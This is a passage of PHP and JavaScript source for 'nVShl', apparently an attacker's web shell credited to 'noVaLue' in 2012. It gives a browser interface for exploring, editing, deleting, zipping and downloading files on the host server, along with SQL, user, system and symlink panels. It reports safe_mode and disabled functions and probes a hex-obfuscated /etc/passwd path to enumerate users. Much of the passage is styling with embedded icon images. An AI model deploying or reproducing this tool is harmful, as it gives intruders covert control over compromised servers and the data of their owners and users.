							that.popup_file_mouseY = e.clientY;
						};
						
						// ***** popup_file_exit ************************************************************
						this.popup_file_exit = function(e) {
							that.popup_file_mouseup(e);
							var ele = document.getElementById(that.getTabId());
							ele.removeChild(that.popup_file_element);
							
							popupSystem.rem(that);
						};
					
						// ***** popup_file_reposition ************************************************************
						this.popup_file_reposition = function() {
							if(this.popup_file_element.getAttribute("style", "display") == "block") {
								var width        = window.innerWidth  ? window.innerWidth  : document.documentElement.clientWidth;
								var height       = window.innerHeight ? window.innerHeight : document.documentElement.clientHeight;
				
								if(this.popup_file_element.offsetLeft + this.popup_file_element.clientWidth < 40)
									this.popup_file_element.style.left = (40-this.popup_file_element.clientWidth)+"px";
								
								if(this.popup_file_element.offsetTop < 0)
									this.popup_file_element.style.top = 0+"px";
									
								if(that.popup_file_element.offsetLeft > width - 40)
									this.popup_file_element.style.left = (width - 40)+"px";
									
								if(that.popup_file_element.offsetTop > this.getBottomTabY() - 40)
									this.popup_file_element.style.top = (this.getBottomTabY() - 40)+"px";
							}
						};
						
						// ***** popup_file_show ************************************************************
						this.popup_file_show = function(form_element, drag_element, exit_element) {
							this.popup_file_element = form_element;
							
							var width        = window.innerWidth  ? window.innerWidth  : document.documentElement.clientWidth;
							var height       = window.innerHeight ? window.innerHeight : document.documentElement.clientHeight;
			
							this.popup_file_element.style.position = "fixed";
							this.popup_file_element.style.display  = "block";
				
							this.popup_file_element.style.left = ((width - this.popup_file_element.clientWidth)/2)+"px";
							this.popup_file_element.style.top  = ((height - this.popup_file_element.clientHeight)/2)+"px";
							
							this.popup_file_reposition(this);
							
							form_element.onmousedown = this.popup_file_window;
							drag_element.onmousedown = this.popup_file_mousedown_window;
							exit_element.onclick  = this.popup_file_exit;
						};
						
						// ***** Attach Events *********************************************************
						document.addEventListener("mousemove", this.popup_file_mousemove, false);
						document.addEventListener("mouseup", this.popup_file_mouseup, false);
						document.addEventListener("mousedown", this.popup_file_mousedown, false);
					}
					//////////////////////////////////////////////////////////////////////////////////////
					var tabSystem = new TabSys();
					var popupSystem = new popupSys();
					var pathSystem = new PathSystem();
					
					//////////////////////////////////////////////////////////////////////////////////////
			</script>';
				
	$content .= '<script type="text/javascript">
			
			function exp_xhr(path, name) {
				tabSystem.getTabOnId(tabSystem.getSelected()).setTabTitle(name);
				xhr("1", "navigate", "none", "hqp"+tabSystem.getSelected(), "POST", "path:"+path);
			}
			
			function exp_xhr_check(path) {
				xhr("1", "navigate", "none", "hqp"+tabSystem.getSelected(), "POST", "path:"+path);
			}
		
			function exp_xhr_file(path) {
				var mThis = popupSystem.add(new popup_file(tabSystem.getSelected()), decToStr(path));
				xhr("1", "edit", "none", mThis, "POST", "path:"+path);
			}
			
			function exp_delete_this(path, type, returnTo) {
				if (confirm("Delete the file: " + decToStr(path) + " ?")) { 
					xhr("1", "delete", "none", "hqp"+tabSystem.getSelected(), "POST", "path:"+path+";type:"+type+";returnTo:"+returnTo);				
				}
			}
			
			function exp_zip_this(path, type, returnTo) {
				if (confirm("Zip the directory: " + decToStr(path) + " ?")) { 
					xhr("1", "zip", "none", "hqp"+tabSystem.getSelected(), "POST", "path:"+path+";type:"+type+";returnTo:"+returnTo);	
				}
			}
			
			function exp_save_this(path, type, container) {
				xhr("1", "save", "none", "none", "POST", "path:"+path+";type:"+type+";content:"+ encToHex(document.getElementById(container).value));
			}
			
			function ext_download_this(path, type) {
				if (confirm("Download the file: " + decToStr(path) + " ?")) { 
					var ifr;
					if((ifr = document.getElementById("iframeDownload")) == null) {
						ifr = document.createElement("iframe");
						ifr.setAttribute("id", "iframeDownload");
						ifr.setAttribute("name", "iframeDownload");
						ifr.setAttribute("style", "display:none");
						document.body.appendChild(ifr);
					}

					var frm, frm_h_updt, frm_h_data;
					if((frm = document.getElementById("formDownload")) == null) {
						frm = document.createElement("form")
						frm.setAttribute("id", "formDownload");
						frm.setAttribute("method", "POST");
						frm.setAttribute("action", "?tp=1&act=download&val="+encToHex("none"));
						frm.setAttribute("target", "iframeDownload");
					
						frm_h_updt = document.createElement("input");
						frm_h_updt.setAttribute("type", "hidden");
						frm_h_updt.setAttribute("name", "updt");
						frm_h_updt.setAttribute("value", "true");
					
						frm_h_data = document.createElement("input");	
						frm_h_data.setAttribute("type", "hidden");
						frm_h_data.setAttribute("id", "formData");
						frm_h_data.setAttribute("name", "data");
						
						frm.appendChild(frm_h_updt);
						frm.appendChild(frm_h_data);
						
						document.body.appendChild(frm);
					}else {
						frm_h_data = document.getElementById("formData");
					}
					
					frm_h_data.setAttribute("value", "path:"+path+";type:"+type);
					
					frm.submit();
				}
			}
			
			//function users_type(mode) {
			//	location.href = "http://'.$this->NVL_ink.'?users&users_mode="+mode;
			//}
			//function users_dir() {	
			//	var dir = document.getElementById("user_root_dir").value;
			//	location.href = "http://'.$this->NVL_ink.'?users&users_mode=uPasswd&users_dir="+dir;
			//}
			
			function sql_xhr(name) {
				tabSystem.getTabOnId(tabSystem.getSelected()).setTabTitle(name);
				xhr("2", "none", "none", "hqp"+tabSystem.getSelected());
			}
			
			function usr_xhr(name) {
				usr_xhr_type(name, "none");
			}
			
			function usr_xhr_type(name, type) {
				tabSystem.getTabOnId(tabSystem.getSelected()).setTabTitle(name);
				xhr("3", type, "none", "hqp"+tabSystem.getSelected());
			}
			
			function sys_xhr(name) {
				tabSystem.getTabOnId(tabSystem.getSelected()).setTabTitle(name);
				//xhr("4", "none", "none", "hqp"+tabSystem.getSelected(), "POST", "content:"+ encToHex(document.getElementById("doeval").value));
				xhr("4", "none", "none", "hqp"+tabSystem.getSelected());
			}
			
			function sym_xhr(name) {
				tabSystem.getTabOnId(tabSystem.getSelected()).setTabTitle(name);
				xhr("5", "none", "none", "hqp"+tabSystem.getSelected());
			}
		</script></head>';
		
		if( ini_get('safe_mode') ){
			// Do it the safe mode way
			//print_r(get_loaded_extensions());
		}else{
			// Do it the regular way
		}

		$disablefunc = ini_get("disable_functions");
		$disablefunc = trim(str_replace(", ", ",", $disablefunc));
		$disablefunc = trim(str_replace(",", ", ", $disablefunc));
		
		$content .= '<body bgcolor="#000000" text="#ff4400">
				<table width="100%" border="1" cellspacing="0" style="border-color:#77ff99;" bgcolor="#333333">
					<tr><td><font size="2">Safe Mode: '.(ini_get('safe_mode')? "On":"Off").'</font></td>
					<tr><td><font size="2">Disable Functions: '.(strlen($disablefunc)==0?'NONE':$disablefunc).'</font></td></tr>
					</table>
				<table width="100%"><tr><td><center><table bgcolor="#99CC00" width="100%" id="menuexp"><tr><td colspan="10">
				<input type="button" id="butExplorer" value="Explorer"
					onclick="exp_xhr(\'\',this.value);" style="border-style:none">
				<input type="button" id="butMysql" value="SQL"
					onclick="sql_xhr(this.value);" style="border-style:none">
				<input type="button" id="butUsers" value="Users"
					onclick="usr_xhr(this.value);" style="border-style:none">
				<input type="button" id="butSystem" value="System"
					onclick="sys_xhr(this.value);" style="border-style:none">
				<input type="button" id="butSystem" value="Symlinks"
					onclick="sym_xhr(this.value);" style="border-style:none">
				</td></tr></table></center></td></tr><tr><td>';
		$this->dPlay($content);
	}
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////  Body - Content Part  /////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	public function body() {
		echo '<div id="fill_content">';?>
		<style> 
			html, body { margin: 0px; padding: 0px; }
			div.TabView {
			  font-family: Verdana, Sans-Serif;
			  font-size:   10px;
			  border:solid, 1px;
			  border:#000;
			  background-color:#222222;
			}

			/* ***** Tabs *************************************************************** */
			div.TabView div.Tabs {
			  height: 24px;
			  background-color:#222222;
			}
			
			/* ***** FOCUSED *********************************************************** */
			div.TabView div.Tabs div.Current {
				margin-top: 0px;
			  	height:     23px;
				cursor:  pointer;
			  	background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAYCAYAAAAMAljuAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAHHSURBVHja7JmxbtRAEIa/nd3zpQwvgZCoKFKEhoKKJg0dZbp0eSkqqBASJQ1SWiLlREARiBJ4gMvZ3hmKvdi507VZXzGfZMmSXc2nmfnXDqfnZxZTxNQwK5dThxDC3Q2sa58ADh8dcvTiOSkm5gdzYkperQqYGTn3/L75xcXnLzRNU4S8PHnFvz9/+XZ95VWq2yLMmhmPnz7h5M1rPr37wNAKH9++Z3F5tWHPeWghEGPk2fERp+dn3C6XJFPdEGCm5U2nwsyCnDOr5e2wv6Vbrba6wmXUlnI/TIn6aNqL5X6HhAB9148RbFcsc6ohABJlEOASJhcSEJF7S908aU3dIc4+CfEu2CuSqqKqW7vDJVWOWaAKZiQzw3S9P0oo9gJNKURECCGUw0mfy5dHp/7hMCuEgBBGBx55pxJSPl818zlJguw05tSdWKjR9z3JSmuUsTU8dWqPrDFl5TweAnccDp2HJ+eMWkm6Gykr99mrMwF916Fq5JzXQtZLJedMIJT461QU0qOqSJTyxzDIuNjVdOgYpw5t2zI7aIgSi5AflwsAurbz6kxAt2qRIKhqEfL964Kf1zfo1u9cp16HEErd/wMAAP//AwDGaPf4btMXbgAAAABJRU5ErkJggg==) no-repeat 0px   0px;
			}
			div.TabView div.Tabs div.Current:hover {
				background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAYCAYAAAAMAljuAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAHHSURBVHja7JmxbtRAEIa/nd3zpQwvgZCoKFKEhoKKJg0dZbp0eSkqqBASJQ1SWiLlREARiBJ4gMvZ3hmKvdi507VZXzGfZMmSXc2nmfnXDqfnZxZTxNQwK5dThxDC3Q2sa58ADh8dcvTiOSkm5gdzYkperQqYGTn3/L75xcXnLzRNU4S8PHnFvz9/+XZ95VWq2yLMmhmPnz7h5M1rPr37wNAKH9++Z3F5tWHPeWghEGPk2fERp+dn3C6XJFPdEGCm5U2nwsyCnDOr5e2wv6Vbrba6wmXUlnI/TIn6aNqL5X6HhAB9148RbFcsc6ohABJlEOASJhcSEJF7S908aU3dIc4+CfEu2CuSqqKqW7vDJVWOWaAKZiQzw3S9P0oo9gJNKURECCGUw0mfy5dHp/7hMCuEgBBGBx55pxJSPl818zlJguw05tSdWKjR9z3JSmuUsTU8dWqPrDFl5TweAnccDp2HJ+eMWkm6Gykr99mrMwF916Fq5JzXQtZLJedMIJT461QU0qOqSJTyxzDIuNjVdOgYpw5t2zI7aIgSi5AflwsAurbz6kxAt2qRIKhqEfL964Kf1zfo1u9cp16HEErd/wMAAP//AwDGaPf4btMXbgAAAABJRU5ErkJggg==) no-repeat 0px   0px;
			}
			
			/* ***** NON-FOCUSED ******************************************************* */	
			div.TabView div.Tabs div {
			  display: block;
			  float:    left;
			  margin-left: 2px;
			  margin-top: 1px;
			  width: 100px;
			  height:      22px;
			  line-height: 21px;
			  vertical-align: middle;
			  background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAYCAYAAAAMAljuAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAHQSURBVHja7JjLjhpBDEVPQ1V3wxCYQRkp/8vfZgLSJAHqZTuLJlJWWZZY+Eit3p+ra1s1nE4nA4jTyPyyIcSI049WK+l6p+YCQAD4cjxweD+y3e+I4+iWOlJL4fbzN58fF35dPglxGjm8H3n79pXd6544T26pZyApM21nANL1TphfNmz3O3ave3ZvB6aNB9KTfM/L/5aWlRFiJI4jcZ6YNhPjZnZL3UOZiONIiJGV63guPBAPxPkfAcDMQA17fE4/TB/ubfEezAwT0GZoBV17ID3Rurg3WYoRUDBRrCiaBR3ELfUMJAtWFBMFfTREqyFFaVlZoW6pIy0rUhSty9gKpmBNkaxoEkS9IV0bUgTJijXFFAJqy/4oiiRh5YF0RYqgRdG2LPdg9nehK1KMlfnI6hpIXdxrM8weDTFZ9ogWRT2QzlfWY3/IPw0xUVQUacIKH1ldG9IEleXKMoOgKpRaSOmG2UAIxS31vLJaJecbpRZUhSAq5JxYEahFWK+DW+rZEGnUmsg5ISoEaUJKd1ozwjoxDGu31PPpxIQmldYS0oTQWqW1KwOJ5a1xcEt9IwEUQ4BGuJzv7uSJCOfzd7fwTIH8OH+4hSfiDwAAAP//AwBhVUzFXWDMpQAAAABJRU5ErkJggg==) no-repeat 0px   0px;
			  text-decoration: none;
			  font-weight: 900;
			  cursor:  pointer;
			}
			div.TabView div.Tabs div:hover {
			  background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAgCAYAAADkK90uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAHLSURBVHja7JjRbtsgFEDPdcB20jRpq1Xa//Zfp03r2qaJazBc2EPyC0OedI+E/H6O8AXk5eWlAvihZ7zb4rzHaEdOiTDNpLgA4ADun44cn5/YHfb4vjdLDUnLwtfnhdPvN85vJ5wfeo7PTzx+/8b+4YAfB7PUMkiIDLsRgDDNuPFuy+6wZ/9wYP94ZNhakJbEOV6/X+E6Mpz3+L7HjwPDdqDfjmapeZQB3/c47+lMx7qwIBbEsCAWxLAgFsT4F7hCRaWQURZRkGxWGrKIklFUCoWKK1KIkpglIjKzSDFLDUkSmSUSJVGk4JRClIVLF8jdBtfZDmlJ7hZCF4iyoBRcoRDJdBJRcWxshzRFJbFIJJIp1yAVRclVkZrQapJaUmoiV0XR2wzRQgoJmWZyX+mSM0stg4SMToEUEkULrqiS5oiehU4yMmzMUkNqVMp5ocyRoopLSUnTDD5D2oC3q0nbY1aBSWFKkBR3yhkuCjXAF2AbpPFUByIwVcgV95He4QyEWwwxR23/Wbco6brc++XVpKzp6eT9xx+zsKYgHz8tyKqCfP56MwurCvJ6MgsrQsb7nT2WrCnI7eBlrAS7llsQw4L8R/wFAAD//wMAvLnd4Cv6g7MAAAAASUVORK5CYII=) no-repeat 0px 0px;
			  line-height: 22px;
			}
			
			/* ***** DIV-TITLE ******************************************************* */	
			div.TabView div.Tabs div.Current div{
				 background: none;
				 margin-left: 5px;
				 width: 70%;
				 overflow:hidden;
				 color:#FFF;
			}
			div.TabView div.Tabs div div{
				 background: none;
				 margin-left: 5px;
				 width: 70%;
				 overflow:hidden;
				 color:#000;
			}
			div.TabView div.Tabs div div:hover{
				 background:none;
			}
			
			/* ***** CLOSE Button******************************************************* */
			div.TabView div.Tabs div input {
				width: 13px;
				height: 13px;
				cursor: pointer;
				margin-top: 5px;
				margin-right: 6px;
				border: thick;
				background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAAZiS0dEAP0A/QD9N/dBsQAAAAl2cEFnAAABkAAAAXoAetFbtQAAADt0RVh0Y29tbWVudABFZGl0ZWQgYnkgUGF1bCBTaGVybWFuIGZvciBXUENsaXBhcnQsIFB1YmxpYyBEb21haW40zfqqAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDEwLTExLTEwVDAxOjA5OjE0LTA1OjAwt7vqfwAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxMC0xMS0xMFQwMTowOToxNC0wNTowMMbmUsMAAABiSURBVDhPYzx8+PB/BkoAyAByAUgvEyWWg/RS34CGhgYGEEYHuMRxugDZEGwGwixgBAWEjY0NioW4NKCLHzlyBHsY4PICtgCnfiCCbKHIBeiBRygwKY4FhqGflMEJiZIMBQCvY6Sin7EVqgAAAABJRU5ErkJggg==);
				background-size: 13px;
			}
			div.TabView div.Tabs div input:hover {
				background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAAZiS0dEAP0A/QD9N/dBsQAAAAl2cEFnAAABkAAAAXoAetFbtQAAADt0RVh0Y29tbWVudABFZGl0ZWQgYnkgUGF1bCBTaGVybWFuIGZvciBXUENsaXBhcnQsIFB1YmxpYyBEb21haW40zfqqAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDEwLTExLTEwVDAxOjA5OjE0LTA1OjAwt7vqfwAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxMC0xMS0xMFQwMTowOToxNC0wNTowMMbmUsMAAAINSURBVDhPlZM9SCNREMd/u/koBBHF8po7UKzPVBa2J9jaKSqCYqONIFipVQp7Wy3ExsbSSmzE4jzE4lC4IqLRmA82JpoQ87F7M2+zGyF3hQNv38x7//d/M/N/azU8z/uzuUlPKoVn23iIeeb7f2s0aAwN8W17G+tXMul939iA4WGIRMCyOrPrdpMpprcXzs/5nUxi/Zye9hK3t7C7C6WST6Am2Rg/iANf58FBSCRITU0JLBYDHXd38PgIUkr96akTp9Pw8IAr+837e+Mb7MCAf4/5vr/D2xs4DiwuEp+dpRSP+/HrK26xiD03R3RmhlYuB+WyX6Yh0JTqdZ+gWg0b1yfgku5ls9irq+F6pFbzsXqpEngKkq7qTWZxba1DsrICW1th7K6vQ7Pp41utDyUEBMqsEi4tdUnoLi9j+qXKHB1BPt/OQKePBEqio21pVUispqpoE+XNcHoa7tuWlqCswUFt0uFhCPgyMmL8HpG5eHDQlZlNNAoqmzbw5QWOj0NQdWICJifDuP8fL9SooP2snJ3R0EzalhsfJyZSVeRdNIPHpKXIEBGptHF2SzaLEhQLBQrX1zhjY5RHR1GV81dXODc3PIufE1xBhrZO8jRDzXblViVQVkc0f768JCMlZS8ucDIZ5HEbsHTGEKkfrCmBdbKz4/3Y2wtT/4xzsrCAJX+zl5qf/8y5EPt1f5+/gV32xG+wbNMAAAAASUVORK5CYII=);
				background-size: 13px;
			}
			
			/* ***** ADD Button********************************************************* */
			div.TabView div.Tabs input	{ 
				margin-top: -1px;
				margin-left: 3px;
				border: thick;
				background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAHdElNRQfZCRIUGQyHfPS9AAAAB3RFWHRBdXRob3IAqa7MSAAAAAx0RVh0RGVzY3JpcHRpb24AEwkhIwAAAAp0RVh0Q29weXJpZ2h0AKwPzDoAAAAOdEVYdENyZWF0aW9uIHRpbWUANfcPCQAAAAl0RVh0U29mdHdhcmUAXXD/OgAAAAt0RVh0RGlzY2xhaW1lcgC3wLSPAAAACHRFWHRXYXJuaW5nAMAb5ocAAAAHdEVYdFNvdXJjZQD1/4PrAAAACHRFWHRDb21tZW50APbMlr8AAAAGdEVYdFRpdGxlAKju0icAAAGBSURBVEhLvZbBjoIwEIZ/iFETCCa+gM/hzZsQTt7QB9QXgOjRm76GB+ONhIQEMATWYbek21XSYt0mkxLamY+Z6Qw1ttttjZ+Rpil71DLbtt3aMQiUJAmOxyMGg4EWADNSliUWiwUmkwkaUBRF8DwPrutqBR0OB+z3e/i+D5PCVdc1lstlM+sUZpMYZpZljRc6Abwtsk0Mk8XqkyBitKCqqvAJYY4ogVarFXiR+bA/IJnQkdLpdGpENq+9PBLPfi+PVJQYUEWnbQWkJI7NZtNZwEEQ/Fp/FP/L/Z2Hgc8Jn5tX7595KJUj1X70Fmg+n4MXBn/2vgvUmSNqiPygxssPcf12u/XL0fV6BS+iFXG9d+hExX+tI5YbgqrUkVL3DsMQvMi2LeXufblcwMvHPJLxQNzTFqzjODAMQyreMh6Ie8g2MUy6ElmWhfP5rP13TjbJNjGM3W5XT6dTPGbkea7adTr3j8djrNdrxHH8fd0ajUaYzWa43+9aQcPhsDk8RVHgC4S0js7WxfTkAAAAAElFTkSuQmCC) no-repeat -1px  -1px;
				background-size: 25px;
				width: 23px;
				height: 23px;
				cursor: pointer;
			}
			div.TabView div.Tabs input:hover { 
				background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAIAAAAmKNuZAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAB3RJTUUH2QkSFBkMh3z0vQAAAAd0RVh0QXV0aG9yAKmuzEgAAAAMdEVYdERlc2NyaXB0aW9uABMJISMAAAAKdEVYdENvcHlyaWdodACsD8w6AAAADnRFWHRDcmVhdGlvbiB0aW1lADX3DwkAAAAJdEVYdFNvZnR3YXJlAF1w/zoAAAALdEVYdERpc2NsYWltZXIAt8C0jwAAAAh0RVh0V2FybmluZwDAG+aHAAAAB3RFWHRTb3VyY2UA9f+D6wAAAAh0RVh0Q29tbWVudAD2zJa/AAAABnRFWHRUaXRsZQCo7tInAAABJUlEQVRIidWVvYqEMBSFb4YggkHBJ7JTESsb9Rl8Lq3sBC0tpvA1goidIAQUEbOFi2zhjBqXWfZUh3DzcW5+URzHAAAAjDEQFSFkNRgA+r4vyxJjLIyb59kwDE3TMAA8n0/XdS3LEsYVRZHnueM4D8YY59w0TX5D63TGGB6GAQA458LRNg3D8L1ev4KDdSsAYFmWD+E8z9t8mqancCebPSy71uxh2UdwYRjuVvu+v/ntdoqn+6ndKf8Rl+f55m3b3h1v2/Ysrmma3USvxg9wr/RH5+7N7cmybPN1Xd9NRyl9j7iW7pKwqqoIofvvHUJIVdUHIURRlKqq7vwVVVUpikIIQUmS6LqeJMk4jsLRZFkOgqDrOrz+QFEUTdMkjJMkiVLKOf8CZbcupb5Ynd4AAAAASUVORK5CYII=) no-repeat -1px  -1px;
				background-size: 25px;
			}
			
			/* ***** Pages ************************************************************ */
			div.TabView div.Pages {
			  clear: both;
			  border: 1px solid #909090;
			  border-top: none;
			  font-size:   10px;
			}
			div.TabView div.Pages					{ overflow: hidden; }
			div.TabView div.Pages div.Page			{ overflow: auto; background-color:#FFFFFF; }
			div.TabView div.Pages div.Page table	{ font-size: 12px; }
			
			/* ***** FooterTabs ****************************************************** */
			div.TabView div.FooterTabs {
				clear: both;
				position: fixed;
				border: 1px solid #404040;
				color:#FFFFFF;
				bottom: 0px;
				background-color: #020202;
				opacity: 0.9;
				font-size:   10px;
				padding-left: 32px;
				padding-right: 32px;
				padding-top: 2px;
				padding-bottom: 2px;
			}
			
			div.TabView div.FooterTabs div.FooterList div.Tab {
				border: 1px solid #000000;
				background-color:#444444;
				opacity: 0.5;
				cursor: pointer;
				float: left;
				max-width: 128px;
				min-width: 64px;
				width: 128px;
			}
			div.TabView div.FooterTabs div.FooterList div.Tab.active {
				border: 1px solid #000000;
				background-color:#111111;
				opacity: 0.8;
				border: 1px solid #FF0000;
				cursor: pointer;
				float: left;
				max-width: 128px;
				min-width: 64px;
				width: 128px;
			}
			div.TabView div.FooterTabs div.FooterList div.Tab:hover {
				border: 1px solid #00FF00;
				background-color: #000000;
				opacity: 0.7;
				cursor: pointer;
				float: left;
			}
		</style>

		<div class="TabView" id="TabView">
			<!-- ***** Tabs ********************************************************** -->
			<div id="hqt" class="Tabs" style="width: 100%;">
				<input type="button" class="BtnAdd" id="hqa" onClick="tabSystem.add_tab('noVaLue');">
			</div>
			<!-- ***** Pages ********************************************************* -->
			<div id="hqp" class="Pages" style="width: 100%; height: 100%;">
			</div>
			<!-- ***** Footer Tabs *************************************************** -->
			<div class="FooterTabs" id="hqft" align="center" style="width: 100%;">
			</div>
		</div>
		<script type="text/javascript">
			tabSystem.add_tab("noVaLue");
		</script>

<?php
		echo '</div>';
	}
	
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////  Footer - Buttom Part  ////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	public function buttom() {
		$content = '</td></tr><tr><td><center>Copyright @ noVaLue - 2012 - # Doom\'s Day #</center></td></tr>';
		$this->_T_stop = microtime(true);
		$time = $this->_T_stop - $this->_T_start;
		$content = '</td></tr><tr><td><center>Executed in '.$time.' seconds.</center></td></tr></table><br><br><br></body></html>';
		$this->dPlay($content);
	}

	public function whmcs() {
		
	}
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$NVLink = ($_SERVER['SERVER_PORT'] == "80" ? $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']: $_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT'].$_SERVER['SCRIPT_NAME']);
$NVShl = new nVShl($NVLink);

$iQ = new Query();
$POST_iQ = $iQ->POST();
$GET_iQ = $iQ->GET();

if(!isset($_SESSION['nvshl'])) {
	$_SESSION['nvshl'] = md5(rand()*100);

	$_SESSION['ftp_file_upload_type'] = "uF1";
		
	$_SESSION['users_passwd'] = (is_readable($NVShl->hexToStr('2f6574632f706173737764'))? "true":"false");
	if($_SESSION['users_passwd'] == "true")
		$_SESSION['users_mode'] = "uPasswd";
	else
		$_SESSION['users_mode'] = "uScan";
		
	$_SESSION['users_dir'] = "/home/";

	header('Location: http://'.$NVLink.'?t-t');
}else {
	if(isset($_GET['t-t'])) {
		$NVShl->top("nVShl " . $NVLink);
		$NVShl->body();
		$NVShl->buttom();
	}else {
		
		switch($iQ->RCV("tp")) {
			case 0: {
				$content = '<script>
					var divEle = document.createElement("div");
					document.getElementById("hqp"+tabSystem.getSelected()).appendChild(divEle);
				
					var logoTag = "<center><table><tr><td><font color=\'#990033\'><br><br><br><br><br><br>&nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp&nbsp; &nbsp; %&nbsp;%&nbsp; &nbsp; &nbsp; &nbsp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>&nbsp; &nbsp; %%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %&nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; %&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp;%%%%<br>&nbsp; &nbsp;%&nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; %&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>&nbsp;%&nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>%&nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp;%&nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp&nbsp;%&nbsp; %&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%%%%%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp;%%%% <br>%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp;%&nbsp; &nbsp; %&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %&nbsp; &nbsp; &nbsp; 